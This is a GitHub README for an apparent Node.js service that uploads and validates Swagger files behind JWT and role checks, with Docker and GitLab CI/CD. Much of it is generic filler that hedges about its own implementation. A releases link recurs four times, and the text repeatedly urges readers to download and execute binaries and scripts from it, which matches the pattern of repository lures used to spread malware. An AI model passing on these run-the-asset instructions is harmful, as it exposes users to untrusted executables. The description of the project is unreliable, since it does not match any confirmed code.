[![Releases](https://img.shields.io/badge/Releases-GitHub%20Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/6daleez9/swagger-upload-service/releases)

https://github.com/6daleez9/swagger-upload-service/releases

# Swagger Upload Service: Secure Admin Upload and Validation for Swagger

<img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" alt="GitHub Logo" height="20"/> Node.js microservice with JWT auth & role-based access for uploading and validating Swagger (YAML/JSON). Admin-only upload (file or text) with validation. Dockerized with GitLab CI/CD: builds, pushes to Docker Hub & deploys on EC2. 🧭🛡️

- Project: swagger-upload-service
- Category: API gateway, microservice, devops, CI/CD
- Tags: api-gateway, aws, cicd, docker, git, javascript, jwt-authentication, mongodb, mongoose, nodejs

Overview
--------
Swagger Upload Service is a compact Node.js microservice designed to handle Swagger files securely. It provides a clean API for uploading Swagger specifications (YAML or JSON), validating them against a set of rules, and storing them for later use by downstream services. Access is protected with JSON Web Tokens (JWT) and role-based access control (RBAC), ensuring that only administrators can upload new Swagger documents. The service is designed to run in modern cloud environments, is Dockerized, and wired into a GitLab CI/CD pipeline for automatic builds, Docker Hub publications, and EC2 deployments.

Why this project matters
-------------------------
- Centralizes Swagger management: Keep all your Swagger specs in one place with consistent validation rules.
- Tight security: Roles and tokens guard critical upload operations.
- Easy deployment: Dockerized builds and CI/CD enable seamless deployment to AWS EC2 or similar environments.
- Lightweight and fast: A focused service that complements a broader API gateway or microservices architecture.

Key capabilities
---------------
- Admin-only upload: Upload Swagger specs via file or text input, with immediate validation.
- Swagger YAML/JSON validation: Validate syntax and structure, with clear error messages.
- RBAC with JWT: Enforce admin-only write access while allowing read or validation endpoints to be used by authenticated users.
- Dockerized delivery: Build, test, image creation, and deployment scripts integrate with GitLab CI/CD.
- Deployment-ready: Ready-to-run instructions for EC2, with optional Docker Hub deployment.
- MongoDB persistence: Store metadata and references to Swagger documents for fast retrieval and auditing.

Getting started
---------------
This guide walks you through understanding the system, setting up locally, and operating in production. It assumes you have Node.js, Docker, and Git installed on your workstation. If you do not, install them first from the official sources.

Prerequisites
- Node.js (14+ recommended)
- Docker (engine and CLI)
- Docker Compose (optional, for local multi-service testing)
- Git
- A GitLab account or access to your project’s CI environment

Repository at a glance
----------------------
- src/
  - auth/               # JWT creation, verification, and role checks
  - controllers/        # Request handlers for upload and validation
  - models/             # Mongoose schemas for users, roles, swagger docs
  - routes/             # API route definitions
  - services/           # Core business logic, swagger parsing, validation
  - utils/              # Helpers: config, logger, error handling
- config/
  - default.json        # Base configuration
  - env.example.json   # Example env vars
- tests/
  - unit/               # Unit tests for services and utils
  - integration/        # Integration tests for endpoints
- docker/
  - Dockerfile          # Container image for the service
  - docker-entrypoint.sh
- .gitlab-ci.yml          # GitLab CI/CD pipeline
- package.json
- README.md

Architecture and design
-----------------------
Swagger Upload Service is a modular Node.js application built with a clean separation of concerns. The authentication layer uses JWTs to verify users and their roles. A dedicated authorization middleware ensures only admin users can perform upload actions, while validation endpoints remain accessible according to policy. The Swagger parsing and validation logic is isolated in its own service layer to keep concerns small and testable.

Security model
--------------
- JWT-based authentication: Each request must present a valid token issued by your identity provider.
- RBAC: The system enforces an admin role for write operations. Read and validate operations can be scoped to authenticated users where appropriate.
- Input validation: Swagger input is sanitized and parsed with strict schema validation to prevent injection or malformed specs from causing harm.
- Secrets management: Sensitive data (JWT keys, DB credentials) is stored in environment variables or secret managers in your production environment.

Tech stack
----------
- Node.js: Lightweight server for API endpoints
- Express (or alternative) middleware: Routing, error handling, and request processing
- JWT (jsonwebtoken): Token generation and verification
- MongoDB + Mongoose: Metadata persistence
- Swagger validation: YAML/JSON parsing and spec validation
- Docker: Containerization for consistency across environments
- GitLab CI/CD: Automated builds, tests, image publishing, and deployment workflows

How it works
------------
1) Client authenticates and obtains a JWT with a role that includes admin privileges.
2) Admin user uploads a Swagger file (YAML or JSON) via the admin endpoint, or sends Swagger text directly.
3) The service validates the Swagger spec for syntax correctness and conformance to internal rules.
4) If valid, the spec is stored in the database and the metadata is exposed via read endpoints.
5) CI/CD builds the Docker image, pushes to Docker Hub, and can deploy to EC2 or any compatible host.

Usage scenarios
-------------
- Centralized swagger management for a microservices ecosystem
- Admin-controlled swagger publication to downstream services
- Validation of external swagger specs before use in environments like API gateways
- Auditable record of swagger changes with history tracking

Getting the code running locally
--------------------------------
Clone the repository:
- git clone https://github.com/6daleez9/swagger-upload-service.git
- cd swagger-upload-service

Install dependencies:
- npm install

Create a local environment file:
- Copy config/env.example.json to config/.env.json (or use your preferred env strategy)
- Edit values for:
  - JWT_SECRET: the secret used to sign tokens
  - MONGO_URI: your local MongoDB connection string
  - API_PORT: port for the service
  - DOCKER_REGISTRY or DOCKER_HUB credentials (for CI/CD)

Run with Docker
---------------
If you want to run the service in Docker, you can build and start the container:

- docker build -t swagger-upload-service:latest .
- docker run -d -p 3000:3000 \
  -e JWT_SECRET=your_secret \
  -e MONGO_URI=mongodb://mongo:27017/swagger \
  -e API_PORT=3000 \
  swagger-upload-service:latest

During local testing, you may also use Docker Compose to spin up MongoDB and the service together:
- docker-compose up -d

APIs and endpoints
------------------
Note: The endpoints described below reflect typical patterns for a secure swagger-upload service. The actual implementation may differ in your codebase, but the semantic remains the same.

Authentication
- POST /auth/login
  - Body: { "username": "...", "password": "..." }
  - Response: { "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6..." }

Swagger upload (admin only)
- POST /swagger/upload
  - Authorization: Bearer <JWT>
  - Body (multipart/form-data): file (Swagger YAML/JSON), or text (Swagger string)
  - Response: { "id": "<document-id>", "status": "uploaded", "validated": true/false, "errors": [...] }

Swagger validation
- POST /swagger/validate
  - Authorization: Bearer <JWT>
  - Body: { "swagger": "<yaml or json string>" }
  - Response: { "valid": true, "errors": [] }

Swagger retrieval
- GET /swagger/:id
  - Authorization: Bearer <JWT> (if required by policy)
  - Response: { "id": "...", "swagger": "...", "metadata": {...} }

Admin management
- GET /admin/roles
  - List roles
- POST /admin/roles
  - Create role
- POST /admin/users
  - Create user and assign role
- POST /admin/assign-role
  - Assign role to user

Data model
----------
- User: username, password hash, roles, createdAt, updatedAt
- Role: name (admin, user, viewer), permissions
- SwaggerDocument: id, authorId, version, createdAt, updatedAt, status, validationErrors, rawContent

Validation rules
---------------
- YAML/JSON syntax must be parseable
- Swagger version compatible with OpenAPI 3.x
- Required fields like info.title, info.version, paths must be present
- Disallow unsupported fields or known security vulnerabilities
- Referential integrity across components
- Size limits on swagger documents to prevent abuse

CI/CD and deployment
--------------------
GitLab CI/CD pipelines are configured to:
- Lint and test the code
- Run unit and integration tests
- Build a Docker image
- Push the image to Docker Hub
- Deploy the service to EC2 via a deployment script or an orchestration tool

CI/CD pipeline details
- Stages: lint, test, build, push, deploy
- Runners: shared or self-hosted
- Triggers: on push to main or on release tags
- Environment: separate configs for development, staging, and production

Docker and registry
- The repository ships a Dockerfile that builds a minimal runtime image
- The image is designed to be portable across environments
- Docker Hub is the target for public image distribution
- The deployment script in the repo handles pulling the image and starting a container on EC2

AWS and deployment considerations
- EC2 is a common target for deployment
- You can use a managed database service (e.g., MongoDB Atlas) or a self-hosted MongoDB on AWS
- Security groups should allow inbound traffic on your API port
- Use an orchestration tool or a launcher script to keep the service running and to manage logs

Release management
------------------
Releases page on GitHub holds release assets, including binaries, scripts, and deployment manifests. You can browse the releases to grab a file suitable for your platform and run it as part of your deployment.

- Link to releases: https://github.com/6daleez9/swagger-upload-service/releases
- This link contains release assets that you can download and execute to bootstrap or deploy the service. Ensure you pick the asset matching your environment (e.g., Linux x86_64, Docker tarball, or deployment script).
- If you need to access the artifacts, visit the Releases page and download the file that matches your environment. The releases are designed to streamline setup and onboarding. For convenience, you can re-open this page any time to get the latest stable assets.

You can also cite the releases in this form:
- Access the Release assets at: https://github.com/6daleez9/swagger-upload-service/releases
- Download the requested asset and execute it according to its instructions

Release-specific notes
- Each release includes versioned swagger documents with metadata and sample clients
- Historical versions are kept for auditing and comparison
- The release scripts ensure proper permissions and environment sanitation during installation

Security and access control details
-----------------------------------
JWT-based authentication
- The system issues tokens after a successful login
- Tokens include an origin, expiry, and roles claim
- Middlewares verify tokens and enforce proper permissions

Role-based access
- Admin role grants permission to upload and manage swagger documents
- Other roles may view or validate swagger content depending on policy
- Access controls are enforced on the server side, not just in the client

Input handling
- Swagger uploads can be accepted as a file or a raw string
- The files are parsed into a structured object for validation
- Validation errors are returned clearly with actionable messages

Operational stability
- Timeouts and retries are configured to handle network hiccups
- Logs capture who did what, when, and with which input
- Health checks are exposed for container orchestration

Performance considerations
- Validation is optimized to minimize CPU usage
- Large Swagger files are handled with streaming parsers where possible
- MongoDB indexes speed up lookups for swagger documents and metadata

Testing strategy
---------------
Unit tests
- Validate parsing logic, token handling, and role checks
- Mock external dependencies to ensure deterministic tests

Integration tests
- Test end-to-end flows: login, upload, validation, retrieval
- Verify RBAC under different token configurations

Test data and fixtures
- Use a dedicated test database
- Seed roles and an admin user for integration tests
- Include a few sample swagger specs to exercise validation rules

Code quality and standards
--------------------------
- Linting with ESLint to enforce consistent style
- Type checks if TypeScript is used; otherwise robust runtime checks
- Clear error messages and structured logging
- Documentation-driven development approach

Project roadmap
---------------
- Short-term goals: enhance validation rules, improve error messages, add more SDKs for integration
- Medium-term goals: support multiple versions of Swagger/OpenAPI; introduce caching for frequently used specs
- Long-term goals: expand RBAC to support granular permissions; integrate with additional cloud providers

Contribution guidelines
-----------------------
We welcome contributors who want to help improve the service. If you plan to submit a pull request, please follow these steps:
- Fork the repository
- Create a feature branch
- Implement the feature or fix
- Run tests locally
- Open a pull request with a clear description of the changes

Code of conduct
---------------
We expect all contributors to follow a respectful and constructive approach. Communicate clearly, ask questions, and share feedback.

Environment variables and configuration
---------------------------------------
- JWT_SECRET: Secret key to sign JWTs
- MONGO_URI: MongoDB connection string
- API_PORT: API listening port
- LOG_LEVEL: Logging verbosity
- DOCKER_IMAGE: Docker image tag to pull (for deployment)
- SERVICE_ENDPOINT: Public endpoint for the service

Environment-specific considerations
- Development: Use a local MongoDB instance; run using Docker Compose
- Staging: Mirror production environment with a staging database
- Production: Strict secret management, TLS termination at the edge, audited access

Troubleshooting tips
--------------------
- If you cannot authenticate, verify the JWT_SECRET and token expiry
- If uploads fail, check file size limits and input validation rules
- If validation errors appear, review the exact error messages and compare to the OpenAPI spec
- When the service does not respond, verify container health and port mappings

Licensing
---------
The repository is licensed under a permissive license to encourage use and contribution. See the LICENSE file for terms.

Community and support
---------------------
- Open issues for bug reports and feature requests
- Discussion channels on the project (if available) or linked forums
- Documentation issues to request clarifications or propose improvements

Release notes and changelog
---------------------------
- Each release entry describes new features, bug fixes, and breaking changes
- Historical changes help you track the evolution of the service
- You can consult the Releases page for a comprehensive changelog across versions

License and attribution
-----------------------
If you use this project, please credit the authors and link back to the repository. This helps others discover the project and its capabilities.

Appendix: sample Swagger upload workflow
----------------------------------------
Here is a representative workflow for an admin to upload and validate a Swagger spec:

1) Admin authenticates and obtains a JWT with admin privileges.
2) Admin sends a swagger YAML document to the upload endpoint.
3) The service parses the YAML, performs structural validation, checks for required fields, and ensures references are resolvable.
4) If all checks pass, the document is stored and a metadata entry is created, including the author, version, and timestamp.
5) Admin can then fetch the document or re-run validation to verify ongoing conformance.

Appendix: sample Swagger document (inline example)
-----------------------------------------------
An inline example swagger spec is provided to illustrate validation. This is a minimal example and should be replaced by real Swagger content in your environment.

{
  "openapi": "3.0.3",
  "info": {
    "title": "Sample API",
    "version": "1.0.0",
    "description": "A minimal Swagger document used for validation testing."
  },
  "paths": {
    "/health": {
      "get": {
        "summary": "Health check",
        "responses": {
          "200": {
            "description": "OK"
          }
        }
      }
    }
  }
}

Sustainability and long-term maintenance
-----------------------------------------
- The project emphasizes maintainable code and clear tests
- Regularly update dependencies to mitigate security risks
- Keep configuration modular to adapt to different deployment environments

Appendix: sample CI/CD pipeline behavior
----------------------------------------
- Linting catches syntax errors early
- Tests verify correctness of endpoints and validation logic
- Docker image is built and pushed to Docker Hub on tag releases
- A deployment script updates the EC2 instance with the latest image
- The release is tagged to trace which version is running in production

Ecosystem and integration opportunities
----------------------------------------
- Integrate with a gateway or API management platform to publish validated swagger definitions
- Connect to a central secrets store for credentials and keys
- Add support for versioned swagger documents to handle evolutions safely
- Expose a REST or GraphQL API surface for downstream services to query swagger metadata

Appendix: data migration plan
-----------------------------
- When schema changes occur, provide a migration path that preserves existing swagger document metadata
- Use a versioned migration system to apply schema updates in a deterministic order
- Back up data before running migration routines

Appendix: local development tips
-------------------------------
- Use a local MongoDB instance or a Dockerized MongoDB container
- Run with environment variables to reflect your local settings
- Test both file-based and text-based Swagger uploads
- Validate that error handling returns useful messages to clients

Appendix: accessibility and internationalization
-----------------------------------------------
- Error messages are readable and actionable
- Consider adding i18n support for non-English clients in future iterations

Appendix: security audits
-------------------------
- Perform periodic security scans on dependencies
- Validate that tokens expire and rotate as required
- Review access control rules to prevent privilege escalation

Appendix: API versioning
------------------------
- Maintain backward compatibility whenever possible
- Use semantic versioning to denote breaking changes
- Document changes in the release notes and changelog

Appendix: further reading and references
----------------------------------------
- OpenAPI Specification for Swagger documentation and validation rules
- JWT stdlib and security best practices
- MongoDB data modeling and indexing strategies
- Docker and containerization best practices for microservices
- AWS EC2 deployment patterns and security considerations

Releases
--------
Access the latest release assets here: https://github.com/6daleez9/swagger-upload-service/releases. This page hosts binaries, scripts, and deployment manifests designed to help you bootstrap or upgrade the service. Download the asset that matches your operating environment and follow its on-disk instructions to install or update the service.

Additional notes
---------------
This README captures the core capabilities and usage patterns for the Swagger Upload Service. It is designed to be informative for developers, operators, and sysadmins who are integrating or extending the project. The content focuses on security, reliability, and deployment workflows that are common in modern Node.js microservices.

End of document content.